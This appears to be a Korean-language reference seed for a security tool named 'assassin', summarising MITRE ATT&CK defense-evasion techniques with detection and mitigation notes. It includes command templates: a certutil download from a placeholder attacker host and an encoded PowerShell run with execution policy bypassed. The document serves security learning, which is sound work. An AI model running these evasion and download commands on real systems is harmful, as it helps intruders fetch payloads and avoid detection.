# 학습 시드(심화): defense-evasion

> 종합 레퍼런스(확립된 보안 지식 · 권위 출처 검증가능). 라이브 최신화: `assassin --learn defense-evasion`. P1: 머신별 라이트업 미참조.

## 개요
탐지회피(TA0005): 로그/방어 우회로 은밀 유지.

## 핵심 기법 · 열거
- 로그삭제(1102)·AMSI/ETW 패치·LOLBins·난독화
- 타임스토핑·서명바이너리 악용·프로세스 인젝션·BYOVD

## 표준 도구 · 명령
```
# LOLBin 예: certutil -urlcache -f http://<lhost>/x x
powershell -ep bypass -enc <base64>
```

## 블루팀 탐지
1102 로그삭제·비정상 LOLBin(certutil/mshta/rundll32) 인자·AMSI 우회 패턴.

## 완화
변조방지 로깅·스크립트블록 로깅·EDR·LOLBin 제한(WDAC).

- 출처(검증): https://attack.mitre.org/tactics/TA0005/

## 최신 보강(승격)

> `assassin --promote` 품질 관문을 통과한 권위 출처 발췌. 수정·삭제는 PR 리뷰로. 사람이 다듬은 위 섹션이 우선한다.

### ATT&CK TA0005 Defense Evasion
- 출처: https://attack.mitre.org/tactics/TA0005/
- 승격일: 2026-10-07
- 요약: Stealth The adversary is trying to hide and conceal their actions, appearing as normal behavior. Stealth consists of techniques that reduce the likelihood of detection by blending in with legitimate activity or minimizing observable signals. These techniques are characterized by concealment behaviors, such as avoiding, obfuscating, or mimicking normal operations, without modifying security controls or compromising collection and monitoring feeds. The goal is to remain indistinguishable from beni
